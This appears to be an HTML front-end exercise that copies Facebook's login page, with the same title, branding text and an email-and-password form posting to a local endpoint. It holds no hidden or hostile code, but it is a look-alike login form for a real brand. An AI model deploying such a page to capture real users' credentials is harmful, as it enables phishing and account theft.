<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="facebook clone assets/facebook head logo.png" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="styles.css">
    <title>Facebook - log in or sign up</title>
</head>
<body>
    <div class="container w-screen h-screen pt-16 pb-28 bg-slate-100 flex justify-center ">
        <div class="main w-auto h-full mx-36 py-5 flex ">
            <div class="main1 w-3/5 h-full pr-8 pt-24 ">
                <div class="logo "><img  class="w-2/4" src="facebook clone assets/Screenshot 2024-08-13 at 4.00.21â€¯AM.png" alt=""></div>
                <div class="info text-3xl">Facebook helps you connect and share <br>with the people in your life.</div>
            </div>
            <div class="main2 w-2/5 h-full pb-6 pt-3  ">
                <div class="form w-[100%] bg-white h-[321px] mt-7 rounded-lg flex flex-col pt-3 px-3 items-center shadow-xl">
                    <form action="/submit-login" method="post">
                       
                        <input type="email" class="w-[350px] h-[47px] p-4 border-solid border-2 mb-3 border-gray-200 rounded-md" id="email" name="email" placeholder="Email address or phone number" required>
                        <br>
                        
                        <input type="password" class="w-[350px] h-[47px] p-4 border-solid border-2 mb-4 border-gray-200 rounded-md" id="password" name="password" placeholder="Password" required><br>
                        
            
                       <button class="w-[350px] h-[47px] mb-3 bg-[#0866ff] rounded-md text-white font-bold text-[18px] hover:opacity-90"> Log in</button>
                       
                    </form>
                    <a class="text-[#0866ff] mb-3 text-[13.5px] font-medium hover:underline" href="#">Forgotten password?</a>
                    <hr class="h-[1.3px] w-[350px] mb-4 bg-gray-200">
                    <button class="w-[190px] h-[53px] mb-3 bg-[#43b72a] hover:bg-[#41ac29] rounded-md text-white font-medium text-[16px]">Create new account</button>
                    </div>
                
                <div class="form-foot flex mt-5 justify-center text-[13px]"><p><b class="hover:underline">Create a Page</b>  for a celebrity, brand or business.</p></div>
            </div>
        </div>
    </div>
    
</body>
</html>
